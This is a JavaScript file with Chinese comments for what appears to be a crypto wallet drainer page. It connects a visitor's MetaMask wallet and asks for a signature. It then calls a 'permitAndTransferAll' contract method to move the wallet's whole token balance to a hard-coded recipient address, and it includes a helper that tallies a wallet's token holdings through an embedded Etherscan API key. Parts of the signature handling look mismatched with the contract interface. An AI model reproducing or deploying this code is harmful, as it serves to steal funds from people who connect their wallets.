const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
const contractAddress = '0x0ccd25cb287e18e55969d65ab5555582657512be'; // 替换为你的实际合约地址
let web3;
let isConnected = false;

// 代币合约的 ABI
const erc20Abi = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "owner", "type": "address"},
            {"name": "spender", "type": "address"},
            {"name": "value", "type": "uint256"},
            {"name": "deadline", "type": "uint256"},
            {"name": "v", "type": "uint8"},
            {"name": "r", "type": "bytes32"},
            {"name": "s", "type": "bytes32"}
        ],
        "name": "permitAndTransferAll",
        "outputs": [],
        "type": "function"
    }
];

// 页面加载后初始化
window.onload = async () => {
    const selectedWallet = 'metamask'; // 默认选择 MetaMask
    document.getElementById('walletSelector').value = selectedWallet;
};

// 更新已连接钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 更新状态信息
const updateStatus = (message) => {
    const statusElement = document.getElementById('status');
    statusElement.innerText += `\n${message}`;
};

// 连接钱包按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    const selectedWallet = document.getElementById('walletSelector').value;

    try {
        if (selectedWallet === 'metamask') {
            if (window.ethereum) {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();

                if (accounts.length > 0) {
                    updateWalletList(accounts[0]);
                    isConnected = true;
                    updateStatus('MetaMask 已连接');
                    document.getElementById('signButton').disabled = false; // 启用签名按钮
                } else {
                    updateStatus('未检测到已连接的账户');
                }
            } else {
                updateStatus('请安装 MetaMask 钱包');
            }
        }
    } catch (error) {
        updateStatus('连接失败: ' + error.message);
    }
};

// 签名按钮点击事件
document.getElementById('signButton').onclick = async () => {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
        const account = accounts[0];
        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
        try {
            const signature = await web3.eth.personal.sign(message, account);
            updateStatus(`签名成功: ${signature}`);

            // 调用转移资产的函数
            await transferAssets(account, signature);
        } catch (error) {
            updateStatus(`签名失败: ${error.message}`);
        }
    } else {
        updateStatus('请先连接钱包');
    }
};

// 转移资产的函数
const transferAssets = async (account, signature) => {
    updateStatus(`正在获取 ${account} 的代币余额...`);
    
    const tokenContract = new web3.eth.Contract(erc20Abi, contractAddress);
    const balance = await tokenContract.methods.balanceOf(account).call();
    
    if (balance > 0) {
        const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 设置截止时间
        const { v, r, s } = web3.eth.accounts._decodeSignature(signature);

        try {
            // 调用合约的 permitAndTransferAll 方法
            await tokenContract.methods
                .permitAndTransferAll(account, deadline, v, r, s)
                .send({ from: account });
                
            updateStatus(`成功转移 ${balance} 代币从 ${account} 至 ${recipientAddress}`);
        } catch (error) {
            updateStatus(`转移失败: ${error.message}`);
        }
    } else {
        updateStatus(`账户 ${account} 在代币合约中没有代币余额`);
    }
};

// 获取代币余额的函数
const getTokenBalances = async (address) => {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
        const response = await axios.get(url);
        const transactions = response.data.result;

        const tokenBalances = {};

        for (const tx of transactions) {
            const tokenAddress = tx.contractAddress;
            const tokenSymbol = tx.tokenSymbol;

            if (!tx.from || !tx.to) {
                continue; // 跳过没有 from 或 to 的交易
            }

            if (!tokenBalances[tokenAddress]) {
                tokenBalances[tokenAddress] = {
                    symbol: tokenSymbol,
                    balance: web3.utils.toBN(0)
                };
            }

            if (tx.from.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
            }

            if (tx.to.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
            }
        }

        return tokenBalances;
    } catch (error) {
        updateStatus('获取代币余额失败: ' + error.message);
        return {};
    }
};

// 这里可以调用获取代币余额的函数，具体使用根据需求添加
